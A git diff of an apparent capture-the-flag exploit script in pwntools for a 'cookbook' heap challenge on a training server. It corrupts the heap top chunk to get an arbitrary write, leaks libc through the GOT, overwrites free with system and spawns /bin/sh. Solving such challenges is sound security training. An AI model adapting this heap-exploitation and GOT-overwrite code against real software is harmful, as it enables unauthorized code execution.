@@ -7,15 +7,28 @@ pwn.context.arch = 'i386'
 ADDRESS_SIZE = 4
 
 # r = pwn.process('./cookbook', env={'LD_PRELOAD': './libc-2.27.so'})
-r = pwn.process('./cookbook')
+
+r = pwn.remote('training.jinblack.it', 2017)
 
 free_current_ingredient = 0x08048e06
 new_ingredient_malloc = 0x08048dbb
 cookbook_malloc = 0x08048bbc
+set_calories_free = 0x08048fce
+give_recipe_name_null_check = 0x08049434
+recipe_addr = 0x0804d0a0
+free_got = 0x0804d018
 
-pwn.gdb.attach(r, f"""
+breaks = f"""
+    watch *{free_got}
+    watch *{recipe_addr}
+    b *{give_recipe_name_null_check}
+    b *{set_calories_free}
+    b *{cookbook_malloc}
+"""
 
-""")
+# pwn.gdb.attach(r, f"""
+#     c
+# """)
 
 input("wait")
 
@@ -35,19 +48,31 @@ def create_recipe():
     r.sendline("q")
     r.recvuntil(END_OF_MENU)
 
-def name_recipe(name):
+def name_recipe(name, wait=True):
     r.sendline("c")
-    r.recvuntil(END_OF_MENU)
+    if wait:
+        r.recvuntil(END_OF_MENU)
     r.sendline("g")
     r.sendline(name)
-    r.recvuntil(END_OF_MENU)
+    if wait:
+        r.recvuntil(END_OF_MENU)
     r.sendline("q")
-    r.recvuntil(END_OF_MENU)
+    if wait:
+        r.recvuntil(END_OF_MENU)
 
 def create_ingredient():
     r.sendline("a")
     r.recvuntil(END_OF_INGREDIENT_MENU)
     r.sendline("n")
+    r.recvuntil(END_OF_INGREDIENT_MENU)
+    r.sendline("q")
+    r.recvuntil(END_OF_MENU)
+
+def set_ingredient_calories(calories):
+    r.sendline("a")
+    r.recvuntil(END_OF_INGREDIENT_MENU)
+    r.sendline("s")
+    r.sendline(str(calories))
     r.recvuntil(END_OF_INGREDIENT_MENU)
     r.sendline("q")
     r.recvuntil(END_OF_MENU)
@@ -106,6 +131,16 @@ def name_cookbook(name_size, name, wait=True):
         r.recvuntil(END_OF_MENU)
         return leak
 
+def leak_name():
+    END_MARK = "'s cookbook"
+    r.sendline('r')
+    leak = r.recvuntil(END_MARK)[:-len(END_MARK)]
+    r.recvuntil(END_OF_MENU)
+    return leak
+
+def remove_cookbook():
+    r.sendline("R")
+
 RECIPE_INSTRUCTIONS_BUF_SIZE = 0x330
 OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE = 0x50
 
@@ -115,6 +150,7 @@ start()
 
 T_CACHE_LIMIT = 7
 
+# fill t cache to force next allocation to be contained in a bin, which has an address to the next chunk in the heap
 for i in range(T_CACHE_LIMIT):
     create_ingredient()
     name_ingredient(str(i))
@@ -137,21 +173,16 @@ print(hex(heap_leak))
 print("top_chunk_addr:")
 print(hex(curr_top_chunk_addr))
 
+# empty ingredient and buffer tcache to make sure we can make small allocations that will target the top chunk
+# otherwise we will get an already allocated chunk in tcache
+for i in range(T_CACHE_LIMIT - 1):
+    create_ingredient()
+
+for i in range(T_CACHE_LIMIT):
+    name_cookbook(0x80, b"A")
+
 create_recipe()
 name_recipe(b"A" * RECIPE_INSTRUCTIONS_BUF_SIZE + b"B" * OFFSET_FROM_INSTRUCTIONS_TO_TOP_CHUNK_SIZE + pwn.p32(new_top_chunk_size))
-
-# create_ingredient()
-# name_ingredient("a")
-# save_ingredient()
-
-# create_ingredient()
-# name_ingredient("b")
-# save_ingredient()
-
-# loaded_ingredients = ["water", "tomato", "basil", "garlic", "onion", "lemon", "corn", "olive oil"]
-
-# for ingredient in loaded_ingredients:
-#     exterminate_ingredient(ingredient)
 
 def pseudo_arbitrary_write(next_address, data, wait=True):
     global curr_top_chunk_addr
@@ -171,59 +202,64 @@ def pseudo_arbitrary_write(next_address, data, wait=True):
     print(f"next top_chunk address = {hex(curr_top_chunk_addr)}")
     return leak
 
-# we need to move in big sizes to avoid the previous freed chunks (biggest size is 0x58)
-# also, addresses need to be 16 byte aligned
-
+# top chunk moves in multiples of 16
 def align_to_16_bytes(addr):
     return (addr // 16) * 16
 
-cookbook_addr = 0x0804d0a8
-recipe_addr = 0x0804d0a0 # closes 16 byte aligned address to cookbook
-closest_addr_to_cookbook_addr = align_to_16_bytes(cookbook_addr)
-offset_from_closest_addr_to_cookbook = cookbook_addr - recipe_addr
-free_got = 0x0804d018
+OFFSET_FROM_RECIPE_START_TO_INSTRUCTIONS = 140
+new_ingredient_addr = 0x0804d09c
+closest_addr_to_new_ingredient_addr = align_to_16_bytes(new_ingredient_addr)
+offset_from_closes_addr_to_new_ingredient = new_ingredient_addr - closest_addr_to_new_ingredient_addr
 
-pseudo_arbitrary_write(closest_addr_to_cookbook_addr, b"ABCD")
+# the instruction buffer of the recipe will land on top of the address of the global new_ingredient
+# for this, we need to give the recipe pointer a pointer to the new_ingredient address MINUS the offset of the instructions inside the recipe
+# when we get the instructions member from the recipe the offset is added and we are on top of the new_ingredient address
+pseudo_arbitrary_write(recipe_addr, b"ABCD")
+print("moved top chunk")
+pseudo_arbitrary_write(recipe_addr + 0x200, pwn.p32(new_ingredient_addr - OFFSET_FROM_RECIPE_START_TO_INSTRUCTIONS))
+print("arbitrary write set up")
+pseudo_arbitrary_write(recipe_addr + 0x500, b"")
 
-# need to reset the top_chunk size
+def arbitrary_write(addr, data):
+    print(f"Arbitrary write: writing {hex(pwn.u32(data))} to {hex(addr)}")
+    name_recipe(pwn.p32(addr))
+    set_ingredient_calories(ctypes.c_int(pwn.u32(data)).value)
 
-heap_leak_once_more = 0x9b98a90
-recipe_addr_in_heap_once = 0x09b98d10
-recipe_addr_in_heap = heap_leak + recipe_addr_in_heap_once - heap_leak_once_more
+# For some reason, fgets overwrites the recipe pointer after an arbitrary write, so we need to flip the next arbitrary writes to
+# use the ingredient for the addressing and the recipe for writing the data.
+# Doing this from the beginning was not possible because the inaccurate writing with the top chunk overrites addresses above new_instruction which causes problems.
+# Recipe is 16byte aligned so writing to it was precise.
+arbitrary_write(new_ingredient_addr, pwn.p32(recipe_addr))
+print("arbitrary write flipped")
 
-heap_leak_once_again = 0x82d2a90
-start_of_recipe_instructions_once = 0x82d2d9c
-offset_from_heap_leak_to_instructions = start_of_recipe_instructions_once - heap_leak_once_again
+def arbitrary_write_2(addr, data):
+    print(f"Arbitrary write: writing {hex(pwn.u32(data))} to {hex(addr)}")
+    set_ingredient_calories(ctypes.c_int(addr - OFFSET_FROM_RECIPE_START_TO_INSTRUCTIONS).value)
+    name_recipe(data)
+    
+name_addr = 0x0804d0ac
+arbitrary_write_2(name_addr, pwn.p32(free_got))
+print("arbitrary write done")
 
-instructions_addr = heap_leak + offset_from_heap_leak_to_instructions
-print("instructions_addr:")
-print(hex(instructions_addr))
-print("instructions_addr(aligned):")
-aligned_instruction_addr = align_to_16_bytes(instructions_addr) + 0x10
-print(hex(aligned_instruction_addr))
+free_leak = pwn.u32(leak_name()[:ADDRESS_SIZE])
+print("free_leak:")
+print(hex(free_leak))
 
-cookbook_leak = pseudo_arbitrary_write(aligned_instruction_addr, pwn.p32(recipe_addr_in_heap) + b"A" * (offset_from_closest_addr_to_cookbook - ADDRESS_SIZE)  + pwn.p32(free_got))
+free_leak_once = 0xf7e43250
+system_once = 0xf7e05200
+system_offset_from_leak = system_once - free_leak_once
 
-name_recipe(pwn.p32(new_top_chunk_size))
+system_addr = free_leak + system_offset_from_leak
 
-print("top_chunk_resized")
-
-libc_leak = pwn.u32(cookbook_leak[:4])
-
-print("libc leak:")
-print(hex(libc_leak))
-
-libc_leak_once = 0xf7d7d320
-system_addr_once = 0xf7d3f250 
-
-system_offset = system_addr_once - libc_leak_once
-system_addr = libc_leak + system_offset
-
-print("system addr:")
+print("system_addr:")
 print(hex(system_addr))
 
-pseudo_arbitrary_write(free_got, b"ABCD")
-pseudo_arbitrary_write(closest_addr_to_cookbook_addr + 0xf0, pwn.p32(system_addr), wait=False)
-pseudo_arbitrary_write(closest_addr_to_cookbook_addr + 0x100, b"A" * offset_from_closest_addr_to_cookbook  + b"/bin/sh\x00", wait=False)
+puts_got = 0x804d030
+cookbook_addr = 0x0804d0a8
+name_cookbook(0x20, "/bin/sh\x00")
+print("cookbook named")
+arbitrary_write_2(free_got, pwn.p32(system_addr))
+print("replaced free with system")
+remove_cookbook()
 
 r.interactive()
